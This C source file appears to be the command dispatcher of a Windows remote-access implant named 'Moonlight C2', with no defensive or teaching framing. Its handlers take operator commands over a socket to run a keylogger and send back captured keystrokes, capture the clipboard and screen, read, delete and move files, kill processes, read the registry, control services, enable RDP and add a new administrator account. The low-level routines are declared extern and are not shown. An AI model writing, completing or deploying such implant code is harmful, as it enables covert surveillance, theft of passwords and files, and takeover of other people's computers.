/*
 * Moonlight C2 Framework - Complete Monitoring & Control System
 * Integrates all monitoring and control capabilities
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// Assembly monitoring functions
extern int start_keylogger();
extern int stop_keylogger();
extern int get_keylog_data(char* buffer, int max_size);
extern int take_screenshot();
extern int enumerate_processes(char* buffer, int buffer_size);
extern int kill_process_by_pid(DWORD pid);
extern int kill_process_by_name(const char* name);
extern int monitor_clipboard();
extern int get_clipboard_data(char* buffer, int max_size);
extern int get_system_info(void* buffer);
extern int dump_memory_region(DWORD pid, void* base_address, SIZE_T size, void* output_buffer);

// Assembly control functions
extern int list_directory(const char* path, char* buffer, int buffer_size);
extern int create_directory(const char* path);
extern int delete_file(const char* path);
extern int move_file(const char* source, const char* dest);
extern int copy_file(const char* source, const char* dest, int fail_if_exists);
extern int read_file_content(const char* path, char* buffer, int max_size);
extern int write_file_content(const char* path, const char* data, int size);

extern HANDLE open_registry_key(HKEY hkey, const char* subkey);
extern void close_registry_key(HANDLE handle);
extern int read_registry_value(HANDLE handle, const char* value_name, void* buffer, int buffer_size);
extern int write_registry_value(HANDLE handle, const char* value_name, DWORD type, const void* data, int size);

extern int start_service(const char* service_name);
extern int stop_service(const char* service_name);
extern int enable_rdp();
extern int add_user_account(const char* username, const char* password);
extern int add_to_admin_group(const char* username);

// Monitoring state
typedef struct {
    int keylogger_active;
    int screenshot_active;
    int process_monitor_active;
    int clipboard_monitor_active;
    int file_monitor_active;
    DWORD last_update;
} MonitoringState;

MonitoringState g_monitor_state = {0};

// ============================================================================
// COMMAND HANDLERS
// ============================================================================

// Handle keylogger commands
void HandleKeyloggerCommand(SOCKET sock, const char* args) {
    char response[8192];
    
    if (strcmp(args, "start") == 0) {
        if (start_keylogger()) {
            sprintf(response, "[+] Keylogger started\n");
            g_monitor_state.keylogger_active = 1;
        } else {
            sprintf(response, "[!] Keylogger already running\n");
        }
    }
    else if (strcmp(args, "stop") == 0) {
        stop_keylogger();
        sprintf(response, "[+] Keylogger stopped\n");
        g_monitor_state.keylogger_active = 0;
    }
    else if (strcmp(args, "dump") == 0) {
        int bytes = get_keylog_data(response, sizeof(response) - 100);
        if (bytes > 0) {
            char header[128];
            sprintf(header, "[+] Keylog data (%d bytes):\n", bytes);
            send(sock, header, strlen(header), 0);
            send(sock, response, bytes, 0);
            return;
        } else {
            sprintf(response, "[*] No keylog data available\n");
        }
    }
    else {
        sprintf(response, "[!] Usage: keylog <start|stop|dump>\n");
    }
    
    send(sock, response, strlen(response), 0);
}

// Handle screenshot command
void HandleScreenshotCommand(SOCKET sock) {
    char response[256];
    
    printf("[*] Taking screenshot...\n");
    
    if (take_screenshot()) {
        sprintf(response, "[+] Screenshot captured successfully\n");
    } else {
        sprintf(response, "[!] Screenshot failed\n");
    }
    
    send(sock, response, strlen(response), 0);
}

// Handle process enumeration
void HandleProcessListCommand(SOCKET sock) {
    char buffer[16384];
    char response[32768];
    
    int count = enumerate_processes(buffer, sizeof(buffer));
    
    if (count > 0) {
        sprintf(response, "[+] Found %d processes:\n\n", count);
        send(sock, response, strlen(response), 0);
        
        sprintf(response, "%-8s %-40s\n", "PID", "Process Name");
        send(sock, response, strlen(response), 0);
        sprintf(response, "================================================================\n");
        send(sock, response, strlen(response), 0);
        
        char* ptr = buffer;
        for (int i = 0; i < count; i++) {
            DWORD pid = *(DWORD*)ptr;
            ptr += 4;
            char* name = ptr;
            ptr += 260;
            
            sprintf(response, "%-8d %-40s\n", pid, name);
            send(sock, response, strlen(response), 0);
        }
    } else {
        sprintf(response, "[!] Failed to enumerate processes\n");
        send(sock, response, strlen(response), 0);
    }
}

// Handle process kill command
void HandleProcessKillCommand(SOCKET sock, const char* args) {
    char response[256];
    
    // Check if it's a PID or name
    if (args[0] >= '0' && args[0] <= '9') {
        // Kill by PID
        DWORD pid = atoi(args);
        if (kill_process_by_pid(pid)) {
            sprintf(response, "[+] Process %d terminated\n", pid);
        } else {
            sprintf(response, "[!] Failed to terminate process %d\n", pid);
        }
    } else {
        // Kill by name
        int killed = kill_process_by_name(args);
        if (killed > 0) {
            sprintf(response, "[+] Terminated %d process(es) named '%s'\n", killed, args);
        } else {
            sprintf(response, "[!] No process named '%s' found\n", args);
        }
    }
    
    send(sock, response, strlen(response), 0);
}

// Handle clipboard monitoring
void HandleClipboardCommand(SOCKET sock, const char* args) {
    char response[8192];
    
    if (strcmp(args, "monitor") == 0) {
        if (monitor_clipboard()) {
            sprintf(response, "[+] Clipboard changed!\n");
            
            char clip_data[4096];
            int bytes = get_clipboard_data(clip_data, sizeof(clip_data));
            if (bytes > 0) {
                sprintf(response + strlen(response), "[+] Clipboard content:\n%s\n", clip_data);
            }
        } else {
            sprintf(response, "[*] Clipboard unchanged\n");
        }
    }
    else if (strcmp(args, "get") == 0) {
        char clip_data[4096];
        int bytes = get_clipboard_data(clip_data, sizeof(clip_data));
        if (bytes > 0) {
            sprintf(response, "[+] Clipboard content (%d bytes):\n%s\n", bytes, clip_data);
        } else {
            sprintf(response, "[*] Clipboard is empty\n");
        }
    }
    else {
        sprintf(response, "[!] Usage: clipboard <monitor|get>\n");
    }
    
    send(sock, response, strlen(response), 0);
}

// Handle file operations
void HandleFileCommand(SOCKET sock, const char* operation, const char* args) {
    char response[8192];
    char path1[520], path2[520];
    
    if (strcmp(operation, "list") == 0) {
        char buffer[32768];
        int count = list_directory(args, buffer, sizeof(buffer));
        
        if (count > 0) {
            sprintf(response, "[+] Directory listing for '%s' (%d entries):\n\n", args, count);
            send(sock, response, strlen(response), 0);
            
            char* ptr = buffer;
            for (int i = 0; i < count; i++) {
                sprintf(response, "  %s\n", ptr);
                send(sock, response, strlen(response), 0);
                ptr += strlen(ptr) + 1;
            }
        } else {
            sprintf(response, "[!] Failed to list directory '%s'\n", args);
            send(sock, response, strlen(response), 0);
        }
    }
    else if (strcmp(operation, "read") == 0) {
        char buffer[65536];
        int bytes = read_file_content(args, buffer, sizeof(buffer));
        
        if (bytes > 0) {
            sprintf(response, "[+] File content (%d bytes):\n", bytes);
            send(sock, response, strlen(response), 0);
            send(sock, buffer, bytes, 0);
            sprintf(response, "\n");
            send(sock, response, strlen(response), 0);
        } else {
            sprintf(response, "[!] Failed to read file '%s'\n", args);
            send(sock, response, strlen(response), 0);
        }
    }
    else if (strcmp(operation, "delete") == 0) {
        if (delete_file(args)) {
            sprintf(response, "[+] File '%s' deleted\n", args);
        } else {
            sprintf(response, "[!] Failed to delete file '%s'\n", args);
        }
        send(sock, response, strlen(response), 0);
    }
    else if (strcmp(operation, "mkdir") == 0) {
        if (create_directory(args)) {
            sprintf(response, "[+] Directory '%s' created\n", args);
        } else {
            sprintf(response, "[!] Failed to create directory '%s'\n", args);
        }
        send(sock, response, strlen(response), 0);
    }
    else if (strcmp(operation, "move") == 0 || strcmp(operation, "copy") == 0) {
        // Parse two paths
        sscanf(args, "%519s %519s", path1, path2);
        
        if (strcmp(operation, "move") == 0) {
            if (move_file(path1, path2)) {
                sprintf(response, "[+] Moved '%s' to '%s'\n", path1, path2);
            } else {
                sprintf(response, "[!] Failed to move file\n");
            }
        } else {
            if (copy_file(path1, path2, 0)) {
                sprintf(response, "[+] Copied '%s' to '%s'\n", path1, path2);
            } else {
                sprintf(response, "[!] Failed to copy file\n");
            }
        }
        send(sock, response, strlen(response), 0);
    }
    else {
        sprintf(response, "[!] Unknown file operation: %s\n", operation);
        send(sock, response, strlen(response), 0);
    }
}

// Handle registry operations
void HandleRegistryCommand(SOCKET sock, const char* operation, const char* args) {
    char response[4096];
    char key_path[512], value_name[256];
    
    if (strcmp(operation, "read") == 0) {
        sscanf(args, "%511s %255s", key_path, value_name);
        
        HANDLE hkey = open_registry_key((HKEY)0x80000002, key_path); // HKLM
        if (hkey) {
            char buffer[4096];
            int bytes = read_registry_value(hkey, value_name, buffer, sizeof(buffer));
            
            if (bytes > 0) {
                sprintf(response, "[+] Registry value:\n%s\n", buffer);
            } else {
                sprintf(response, "[!] Failed to read registry value\n");
            }
            
            close_registry_key(hkey);
        } else {
            sprintf(response, "[!] Failed to open registry key\n");
        }
        send(sock, response, strlen(response), 0);
    }
    else if (strcmp(operation, "write") == 0) {
        sprintf(response, "[*] Registry write not fully implemented\n");
        send(sock, response, strlen(response), 0);
    }
    else {
        sprintf(response, "[!] Unknown registry operation: %s\n", operation);
        send(sock, response, strlen(response), 0);
    }
}

// Handle service control
void HandleServiceCommand(SOCKET sock, const char* operation, const char* service_name) {
    char response[256];
    
    if (strcmp(operation, "start") == 0) {
        if (start_service(service_name)) {
            sprintf(response, "[+] Service '%s' started\n", service_name);
        } else {
            sprintf(response, "[!] Failed to start service '%s'\n", service_name);
        }
    }
    else if (strcmp(operation, "stop") == 0) {
        if (stop_service(service_name)) {
            sprintf(response, "[+] Service '%s' stopped\n", service_name);
        } else {
            sprintf(response, "[!] Failed to stop service '%s'\n", service_name);
        }
    }
    else {
        sprintf(response, "[!] Unknown service operation: %s\n", operation);
    }
    
    send(sock, response, strlen(response), 0);
}

// Handle privilege escalation
void HandlePrivEscCommand(SOCKET sock, const char* method) {
    char response[256];
    
    if (strcmp(method, "rdp") == 0) {
        if (enable_rdp()) {
            sprintf(response, "[+] RDP enabled successfully\n");
        } else {
            sprintf(response, "[!] Failed to enable RDP\n");
        }
    }
    else if (strncmp(method, "adduser", 7) == 0) {
        char username[128], password[128];
        sscanf(method + 8, "%127s %127s", username, password);
        
        if (add_user_account(username, password)) {
            sprintf(response, "[+] User '%s' created\n", username);
            
            if (add_to_admin_group(username)) {
                sprintf(response + strlen(response), "[+] User '%s' added to Administrators\n", username);
            }
        } else {
            sprintf(response, "[!] Failed to create user\n");
        }
    }
    else {
        sprintf(response, "[!] Unknown privilege escalation method: %s\n", method);
    }
    
    send(sock, response, strlen(response), 0);
}

// Handle system information
void HandleSysinfoCommand(SOCKET sock) {
    char response[1024];
    SYSTEM_INFO sysinfo;
    
    if (get_system_info(&sysinfo)) {
        sprintf(response, 
            "[+] System Information:\n"
            "  Processor Architecture: %d\n"
            "  Number of Processors: %d\n"
            "  Page Size: %d bytes\n"
            "  Minimum Application Address: 0x%p\n"
            "  Maximum Application Address: 0x%p\n",
            sysinfo.wProcessorArchitecture,
            sysinfo.dwNumberOfProcessors,
            sysinfo.dwPageSize,
            sysinfo.lpMinimumApplicationAddress,
            sysinfo.lpMaximumApplicationAddress);
    } else {
        sprintf(response, "[!] Failed to get system information\n");
    }
    
    send(sock, response, strlen(response), 0);
}

// Main command dispatcher
void DispatchMonitoringCommand(SOCKET sock, const char* command) {
    char cmd[256], args[4096];
    
    // Parse command and arguments
    if (sscanf(command, "%255s %4095[^\n]", cmd, args) < 1) {
        return;
    }
    
    printf("[*] Dispatching command: %s\n", cmd);
    
    if (strcmp(cmd, "keylog") == 0) {
        HandleKeyloggerCommand(sock, args);
    }
    else if (strcmp(cmd, "screenshot") == 0) {
        HandleScreenshotCommand(sock);
    }
    else if (strcmp(cmd, "ps") == 0 || strcmp(cmd, "processlist") == 0) {
        HandleProcessListCommand(sock);
    }
    else if (strcmp(cmd, "kill") == 0) {
        HandleProcessKillCommand(sock, args);
    }
    else if (strcmp(cmd, "clipboard") == 0) {
        HandleClipboardCommand(sock, args);
    }
    else if (strcmp(cmd, "file") == 0) {
        char operation[128], file_args[4096];
        sscanf(args, "%127s %4095[^\n]", operation, file_args);
        HandleFileCommand(sock, operation, file_args);
    }
    else if (strcmp(cmd, "registry") == 0 || strcmp(cmd, "reg") == 0) {
        char operation[128], reg_args[4096];
        sscanf(args, "%127s %4095[^\n]", operation, reg_args);
        HandleRegistryCommand(sock, operation, reg_args);
    }
    else if (strcmp(cmd, "service") == 0) {
        char operation[128], service_name[256];
        sscanf(args, "%127s %255s", operation, service_name);
        HandleServiceCommand(sock, operation, service_name);
    }
    else if (strcmp(cmd, "privesc") == 0) {
        HandlePrivEscCommand(sock, args);
    }
    else if (strcmp(cmd, "sysinfo") == 0) {
        HandleSysinfoCommand(sock);
    }
    else {
        char response[256];
        sprintf(response, "[!] Unknown monitoring command: %s\n", cmd);
        send(sock, response, strlen(response), 0);
    }
}

// Show help
void ShowMonitoringHelp(SOCKET sock) {
    const char* help = 
        "\n"
        "=== Moonlight C2 Monitoring & Control Commands ===\n"
        "\n"
        "KEYLOGGING:\n"
        "  keylog start              - Start keylogger\n"
        "  keylog stop               - Stop keylogger\n"
        "  keylog dump               - Retrieve captured keystrokes\n"
        "\n"
        "SCREEN CAPTURE:\n"
        "  screenshot                - Take screenshot\n"
        "\n"
        "PROCESS CONTROL:\n"
        "  ps                        - List running processes\n"
        "  kill <pid|name>           - Terminate process by PID or name\n"
        "\n"
        "CLIPBOARD:\n"
        "  clipboard monitor         - Check if clipboard changed\n"
        "  clipboard get             - Get current clipboard content\n"
        "\n"
        "FILE OPERATIONS:\n"
        "  file list <path>          - List directory contents\n"
        "  file read <path>          - Read file content\n"
        "  file delete <path>        - Delete file\n"
        "  file mkdir <path>         - Create directory\n"
        "  file move <src> <dst>     - Move file\n"
        "  file copy <src> <dst>     - Copy file\n"
        "\n"
        "REGISTRY:\n"
        "  reg read <key> <value>    - Read registry value\n"
        "  reg write <key> <value>   - Write registry value\n"
        "\n"
        "SERVICE CONTROL:\n"
        "  service start <name>      - Start service\n"
        "  service stop <name>       - Stop service\n"
        "\n"
        "PRIVILEGE ESCALATION:\n"
        "  privesc rdp               - Enable Remote Desktop\n"
        "  privesc adduser <u> <p>   - Create admin user\n"
        "\n"
        "SYSTEM INFO:\n"
        "  sysinfo                   - Display system information\n"
        "\n";
    
    send(sock, help, strlen(help), 0);
}
